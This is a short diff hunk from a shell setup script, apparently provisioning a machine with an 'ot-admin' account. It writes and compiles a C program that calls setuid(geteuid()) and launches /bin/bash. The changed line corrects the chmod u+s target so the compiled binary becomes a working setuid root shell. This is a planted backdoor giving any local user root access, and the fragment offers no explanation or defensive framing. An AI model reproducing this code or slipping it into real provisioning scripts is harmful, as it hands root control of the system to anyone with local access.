@@ -105,7 +105,7 @@ echo '#include<sys/types.h>' >> /bin/rootshell/asroot.c
 echo 'int main(){setuid(geteuid());system("/bin/bash");return 0;}' >> /bin/rootshell/asroot.c
 cd /bin/rootshell && gcc asroot.c -o myShell
 if [ $SSH_TYPE -ne 5 ]; then
-  chmod u+s /bin/rootshell/shell 
+  chmod u+s /bin/rootshell/myShell 
 fi
 chown -R ot-admin:admin /home/ot-admin
 
